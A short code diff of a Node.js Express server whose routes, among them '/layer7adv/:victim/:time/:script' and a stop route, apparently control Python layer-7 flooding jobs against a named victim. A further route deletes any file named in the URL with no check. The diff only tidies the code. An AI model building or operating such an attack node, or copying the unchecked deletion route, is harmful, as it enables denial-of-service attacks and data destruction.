@@ -82,9 +82,7 @@ app.get('/layer7adv/:victim/:time/:script', (req, res) => {
 })
 
 app.get('/remfile/:valx/', (req, res) => {
-
     const path = './' + req.params.valx
-
     try {
         fs.unlinkSync(path)
         res.send(200)
@@ -136,10 +134,7 @@ app.get('/reboot/', (req, res) => {
 
 app.get('/layer7stop/', (req, res) => {
     if (pythonActive) {
-        python.kill("SIGINT")
-        python.kill("SIGTERM")
-        machineBusy = false
-        pythonActive = false
+        pythonTermination()
         res.send(200)
     }
     else {
@@ -183,26 +178,4 @@ function pythonTermination(){
     pythonActive = false
 }
 
-app.listen(port, () => console.log(`App listening on port
-${port}!`))
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+app.listen(port, () => console.log(`App listening on port ${port}!`))
